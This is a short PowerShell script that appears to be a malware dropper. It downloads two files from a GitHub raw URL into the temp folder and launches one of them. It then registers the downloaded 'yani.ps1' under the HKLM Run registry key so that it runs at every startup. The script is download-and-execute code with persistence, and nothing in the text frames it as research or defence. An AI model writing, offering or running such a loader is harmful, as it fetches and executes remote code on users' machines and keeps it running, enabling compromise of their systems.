$url = "https://raw.githubusercontent.com/randyman777777777/infarox27/main/iycr.cpp"
$file = "%temp%\iycr.cpp"

Invoke-WebRequest -Uri $url -OutFile $file

# Wait for the download to finish
Start-Sleep -Seconds 5

# Open the downloaded file
Start-Process $file

$url = "https://raw.githubusercontent.com/randyman777777777/infarox27/main/yani.ps1"
$file = "%temp%\yani.ps1"

Invoke-WebRequest -Uri $url -OutFile $file

# Wait for the download to finish
Start-Sleep -Seconds 5

$filePath = "$env:Temp\yani.ps1"

$registryKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

$valueName = "StartupFile"

New-Item -Path $registryKey -Force | Out-Null
Set-ItemProperty -Path $registryKey -Name $valueName -Value $filePath
